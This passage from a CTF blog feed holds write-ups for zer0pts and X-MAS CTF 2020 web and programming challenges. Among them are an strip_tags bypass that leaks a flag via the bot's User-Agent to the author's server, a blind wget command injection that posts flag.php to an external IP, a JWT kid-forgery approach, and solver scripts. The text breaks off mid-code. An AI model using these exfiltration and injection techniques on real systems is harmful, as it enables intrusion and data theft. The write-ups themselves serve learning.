class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>util.php를 보면 render_tags() 함수가 존재합니다. preg_replace() 함수를 이용해서 &#91;&#91;ULR&#93;&#93;이라는 값이 들어오면 &lt;audio&gt;로 변환시켜주고, strip_tags() 함수를 이용해서 audio 태그만 허용하고 있는 것을 볼 수 있습니다. 하지만 strip_tags() 함수에서 취약점이 존재합니다.</strong></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%206.25.19.png?raw=true"></p><p><strong>위 사진을 보면 <code>&lt;a/udio&gt;</code>라는 문자열이 들어와도 <code>&lt;audio&gt;</code>로 인식을 하는 것을 볼 수 있습니다. 중간에 슬래쉬가 들어와도 동일하게 인식을 합니다. 이를 이용해서 오디오 태그 외에 a 태그도 사용을 할 수 있다는 것을 알 수 있습니다.</strong></p><p><b><em><span style="color:#631F9C">&#62;</span> worker.js</em></b></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crawl = <span class="keyword">async</span> (url) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Query! (<span class="subst">$&#123;url&#125;</span>)`</span>);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.setUserAgent(flag);</span><br><span class="line">        <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">&#x27;networkidle0&#x27;</span>,</span><br><span class="line">            timeout: <span class="number">3</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        page.click(<span class="string">&#x27;#like&#x27;</span>);</span><br><span class="line">        <span class="keyword">await</span> page.waitForNavigation(&#123;<span class="attr">timeout</span>: <span class="number">3000</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Done! (<span class="subst">$&#123;url&#125;</span>)`</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>아까 Post를 생성하면 <code>좋아요</code>가 하나 찍히는 것을 확인했습니다. 그래서 해당 로직을 찾아보니 wocker.js에 crawl로 정의를 하는 것을 볼 수 있었습니다.  위 코드는 Post가 생성이 되면 <code>User-Agent</code>의 값으로 <code>FLAG</code>를 넣고, id 값이 like인 버튼을 클릭해서 <code>좋아요</code>를 눌러주는 것을 볼 수 있습니다.</strong></p><p><b><em><span style="color:#631F9C">&#62;</span> init.php</em></b></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">&quot;Content-Security-Policy: default-src &#x27;self&#x27;; object-src &#x27;none&#x27;; script-src &#x27;nonce-$&#123;nonce&#125;&#x27; &#x27;strict-dynamic&#x27;; base-uri &#x27;none&#x27;; trusted-types&quot;</span>);</span><br><span class="line">header(<span class="string">&#x27;X-Frame-Options: DENY&#x27;</span>);</span><br><span class="line">header(<span class="string">&#x27;X-XSS-Protection: 1; mode=block&#x27;</span>);</span><br></pre></td></tr></table></figure><p><strong>그래서 XSS를 이용해서 User-Agent 값을 가져와야 하나 생각을 했지만 위와 같이 CSP가 걸려 있어 불가능해보였습니다,, 하지만 아까 util.php의 render_tags() 함수에서 strip_tags() 함수를 사용해서 태그를 검증하고 있었는데 이때 함수를 우회해서 a 태그를 사용할 수 있었습니다.</strong><br><br></p><p><strong>그럼 content의 값으로 “&#60;a id=’like’ href=’myip’&#62;&#60;/a&#62;”를 주면 click(‘#like’)에 의해서 User-Agent에 FLAG가 들어있는 상태로 myip로 요청이 갈 것 입니다.</strong></p><p><b><em><span style="color:#631F9C">&#62;</span> Exploit</em></b></p><p><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%206.54.47.png?raw=true"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a/udio id=&quot;like&quot; href=&quot;http://141.164.52.207:12345&quot;&gt;GG<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>그래서 위 페이로드를 <code>Content</code>의 값으로 넘겨주니 요청이 내 서버로 전송이 된 것을 확인할 수 있었고, User-Agent 헤더의 flag가 있는 것도 볼 수 있었습니다.</strong></p><p><code>FLAG : zer0pts&#123;M4sh1m4fr3sh!!&#125;</code></p><hr><h3 id="Web-phpNantoKaAdmin-755pts"><a href="#Web-phpNantoKaAdmin-755pts" class="headerlink" title="(Web) phpNantoKaAdmin [755pts]"></a>(Web) phpNantoKaAdmin [755pts]</h3><p><strong>귀찮다.</strong></p><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> Python Pickle RCE </tag>
            
            <tag> REDIS </tag>
            
            <tag> Client Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X-MAS CTF 2020 Write Up</title>
      <link href="2020/12/19/2020-12-19-X-MAS-CTF-2020/"/>
      <url>2020/12/19/2020-12-19-X-MAS-CTF-2020/</url>
      
        <content type="html"><![CDATA[<p>This is the first X-MAS CTF to start studying web security and it was much more fun than I thought. Let’s write a Write Up of interesting problems while solving problems in this CTF.<br><br></p><p>This time, I participated in CTF by collaborating with <span style="color:blue"><code>Einstrasse</code></span>. If you want to see eine’s Write Up, you can go <a href="https://eine.tistory.com/entry/Xmas-CTF-2020-write-ups-focus-on-web-challs?category=826774">here</a>!</p><p><img src="https://github.com/wjddnjs33/image2/blob/main/main.png?raw=true"></p><hr><h3 id="Programming-Least-Greatest"><a href="#Programming-Least-Greatest" class="headerlink" title="(Programming) Least Greatest"></a>(Programming) Least Greatest</h3><p><strong>Challenge Author :</strong> Gabies, Nutu<br><br><strong>Category :</strong> Programming<br><br><strong>Points :</strong> 50<br><br><strong>Solves :</strong> 162<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.13.28.png?raw=true"><br>This time, we will solve the programming problems from X-MAS CTF 2020. The problem was solved easily because <code>eine</code> analyzed the algorithm.<br><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.15.26.png?raw=true"><br>If you connect with nc, you can see that gcd, lcm numbers are given. Here, the number of factors obtained by decomposing the lcm/gcd value by 2^N is given to the next step.<br><br></p><p>It is said that you can do this a total of 100 times, but the time should be within 90 seconds. So I just used Python to write the code and return it.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;challs.xmas.htsp.ro&quot;</span>, <span class="number">6050</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;1/100\n&quot;</span>).strip().split()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span>(<span class="params">_count</span>):</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(_count):</span><br><span class="line">        num = r.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&quot;= &quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        num1 = r.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&quot;= &quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        print(<span class="string">&quot;gcd(x, y) : &quot;</span> + num)</span><br><span class="line">        print(<span class="string">&quot;lcm(x, y) : &quot;</span> + num1)</span><br><span class="line">        s_num = <span class="built_in">int</span>(<span class="built_in">int</span>(num1)//<span class="built_in">int</span>(num))</span><br><span class="line">        cmd = <span class="string">&quot;yafu-x64 factor(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(s_num)</span><br><span class="line">        out = subprocess.check_output(cmd, shell=<span class="literal">True</span>)</span><br><span class="line">        check = out.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        length = check.count(<span class="string">&#x27;P&#x27;</span>)</span><br><span class="line">        data = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">            data.append(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">            data[j] = check.split(<span class="string">&#x27;P&#x27;</span>)[i].split(<span class="string">&quot; =&quot;</span>)[<span class="number">1</span>].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;ans&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        b = []</span><br><span class="line">        k = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                b.append(data[i])</span><br><span class="line">            <span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>+k,<span class="built_in">len</span>(b)):</span><br><span class="line">                    <span class="keyword">if</span> b[j] != data[i]:</span><br><span class="line">                        b.append(data[i])</span><br><span class="line">                        k += <span class="number">1</span>           </span><br><span class="line">        Count = <span class="built_in">len</span>(b)</span><br><span class="line">        count = <span class="number">2</span>**Count</span><br><span class="line">        print(<span class="string">&quot;Round : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(a+<span class="number">1</span>))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(count))</span><br><span class="line">        print(r.recvline())</span><br><span class="line">        r.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    go(<span class="number">100</span>)</span><br><span class="line">    print(r.recv())</span><br></pre></td></tr></table></figure><p>I wrote the exploit code as above.<br><img src="https://github.com/wjddnjs33/image/blob/main/KakaoTalk_Photo_2020-12-18-06-22-00.png?raw=true"><br>When I returned the exploit code, I could see the flag appear.</p><p><code>FLAG : X-MAS&#123;gr347es7_c0mm0n_d1v1s0r_4nd_l345t_c0mmon_mult1pl3_4r3_1n73rc0nn3ct3d&#125;</code></p><hr><h3 id="Web-PHP-Master-easy"><a href="#Web-PHP-Master-easy" class="headerlink" title="(Web) PHP Master easy"></a>(Web) PHP Master <code>easy</code></h3><p><strong>Challenge Author :</strong> yakuhito<br><br><strong>Category :</strong> WEB<br><br><strong>Points :</strong> 33<br><br><strong>Solves :</strong> 325<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.25.00.png?raw=true"></p><p>Solve URL : <code>http://challs.xmas.htsp.ro:3000/?param1=1.0&amp;param2=001</code><br><br><code>FLAG : X-MAS&#123;s0_php_m4ny_skillz-69acb43810ed4c42&#125;</code></p><hr><h3 id="Web-Santa’s-consolation-easy"><a href="#Web-Santa’s-consolation-easy" class="headerlink" title="(Web) Santa’s consolation easy"></a>(Web) Santa’s consolation <code>easy</code></h3><p><strong>Challenge Author :</strong> littlewho<br><br><strong>Category :</strong> WEB<br><br><strong>Points :</strong> 50<br><br><strong>Solves :</strong> 285<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.25.11.png?raw=true"></p><hr><h3 id="Web-flag-checker"><a href="#Web-flag-checker" class="headerlink" title="(Web) flag_checker"></a>(Web) flag_checker</h3><p><strong>Challenge Author :</strong> yakuhito<br><br><strong>Category :</strong> WEB<br><br><strong>Points :</strong> 59<br><br><strong>Solves :</strong> 99<br><br><strong>TL;DR</strong> : Blind Command Injection<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.25.20.png?raw=true"><br>This time, we will solve a problem called <code>flag_checker</code> among web problems in X-MAS CTF 2020.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* flag_checker */</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$example_flag</span> = strtolower(<span class="string">&#x27;FAKE-X-MAS&#123;d1s_i\$_a_SaMpL3_Fl4g_n0t_Th3_c0Rr3c7_one_karen_l1k3s_HuMu5.0123456789&#125;&#x27;</span>);</span><br><span class="line">    <span class="variable">$valid</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$flag</span>) &amp;&amp; <span class="variable">$valid</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$example_flag</span>, strtolower(<span class="variable">$flag</span>[<span class="variable">$i</span>])) === <span class="literal">false</span>) <span class="variable">$valid</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$valid</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="string">&quot;wget -q -O - https://kuhi.to/flag/&quot;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    <span class="variable">$cmd_output</span> = <span class="keyword">array</span>();</span><br><span class="line">    exec(<span class="variable">$command</span>, <span class="variable">$cmd_output</span>);</span><br><span class="line">    <span class="keyword">if</span>(count(<span class="variable">$cmd_output</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Nope&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Maybe&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!checkFlag(<span class="variable">$flag</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;That is not a correct flag!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getFlag(<span class="variable">$flag</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>When it comes to problems, the above PHP source code exists.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$example_flag</span> = strtolower(<span class="string">&#x27;FAKE-X-MAS&#123;d1s_i\$_a_SaMpL3_Fl4g_n0t_Th3_c0Rr3c7_one_karen_l1k3s_HuMu5.0123456789&#125;&#x27;</span>);</span><br><span class="line">    <span class="variable">$valid</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$flag</span>) &amp;&amp; <span class="variable">$valid</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$example_flag</span>, strtolower(<span class="variable">$flag</span>[<span class="variable">$i</span>])) === <span class="literal">false</span>) <span class="variable">$valid</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$valid</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Looking at the checkFlag function, it puts a fake flag in a variable called example_flag, and checks whether the character in $flag is in example_flag.<br><br></p><p>If any of the values of $flag are not included in example_flag, False is returned.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="string">&quot;wget -q -O - https://kuhi.to/flag/&quot;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    <span class="variable">$cmd_output</span> = <span class="keyword">array</span>();</span><br><span class="line">    exec(<span class="variable">$command</span>, <span class="variable">$cmd_output</span>);</span><br><span class="line">    <span class="keyword">if</span>(count(<span class="variable">$cmd_output</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Nope&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Maybe&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The getFlag function receives the $flag value, connects it after the wget command, and sets the output of the exec function as an array.<br><br></p><p>Here, if the command executed well, it prints Maybe, and if not, prints Nope.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!checkFlag(<span class="variable">$flag</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;That is not a correct flag!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getFlag(<span class="variable">$flag</span>);</span><br></pre></td></tr></table></figure><p>In the above part, you can see that the flag value is received, the input value is verified using the checkFlag function, and the getFlag function is executed if the filtering does not occur.<br><br></p><p>In this problem, the command execution value is not output, so the input value must be retrieved to a private server.<br><br></p><p>So, first, let’s check if there is a way to get the php file using the wget command.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.48.39.png?raw=true"><br>When I searched Google for Blind Command Injection, I could see that using the –post-file option of the wget command as above, the file was read and sent as the POST body value.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">80</span>;</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123;</span><br><span class="line">  extended: <span class="literal">true</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;X-MAS!!!!&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(req.body);</span><br><span class="line">res.send();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(PORT, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;--------------------------------&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Listening on port &#x27;</span> + PORT + <span class="string">&#x27;...&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;--------------------------------&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>In order to receive the flag, I built a simple server using Node.js to output the POST body value as above.</p><p><code>Payload : $&#123;IFS&#125;-$&#123;IFS&#125;--post-file$&#123;IFS&#125;flag.php$&#123;IFS&#125;141.164.55.161</code></p><p>So, I passed the payload above as the flag value.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%207.00.30.png?raw=true"><br>When I checked the server log, I could see the flag.php file came.</p><p><code>FLAG : X-MAS&#123;s0_fL4g_M4ny_IFS_bb69cd55f5f6&#125;</code></p><hr><h3 id="Web-X-MAS-Chan"><a href="#Web-X-MAS-Chan" class="headerlink" title="(Web) X-MAS Chan"></a>(Web) X-MAS Chan</h3><p><strong>Challenge Author :</strong> yakuhito, Milkdrop<br><br><strong>Category :</strong> WEB<br><br><strong>Points :</strong> 470<br><br><strong>Solves :</strong> 26<br><br><strong>TL;DR</strong> : JWT Modified<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.25.32.png?raw=true"><br>This time, we will solve the problem called <code>X-MAS Chan</code> among web problems from X-MAS CTF 2020.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%209.41.21.png?raw=true"><br>If you come into trouble, you can see there are links and rules that can get you into the board.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%209.43.59.png?raw=true"><br>When I came to the board, I can see that the file upload function exists as above.<br><br></p><p>And as a result of checking, it was found that only photos such as jpg, png, and gif can be uploaded.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%209.51.25.png?raw=true"><br>Also, if you check the source code, you can see that there is getbanner.php, and the logic is logic to get a picture using jwt. <code>You can see that jwt is set as a value in a cookie called banner.</code><br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%209.55.11.png?raw=true"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;kid&quot;: &quot;&#x2F;tmp&#x2F;jwt.key&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When the jwt is decoded, you can see that the header part uses the <code>HS256</code> algorithm as above and the kid value is using <code>/tmp/jwt.key</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;banner&quot;: &quot;banner&#x2F;11.gif&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>As the data above, you can see that you are receiving a 11.gif photo as the value of the banner. So, if you give <code>flag.php</code> as the <code>value of banner</code>, it will read and return <code>flag.php</code>, not the picture.<br><br></p><p>So how do I <code>sign</code> JWT when I don’t know the <code>secret key</code>?<br><br></p><p>You can think of the kid value in the header as a pointer to the secret key. In the above jwt, since kid points to <code>/tmp/jwt.key</code>, the value contained in jwt.key can be used as the secret key.<br><br></p><p>So, upload a photo using the file upload function, and when the kid points to the photo, you can sign using the binary value of the photo.<br><br><br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%2010.04.11.png?raw=true"><br>I will make a gif file as above and use it.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%2010.06.13.png?raw=true"><br>So, when I uploaded the file, you can see the file was created with the path <code>/b/src/1608071199792.gif</code>. Now, if you give the above path as the <code>kid</code> value in the jwt header, you can use the <code>binary value of the above file</code> as the <code>secret key.</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span 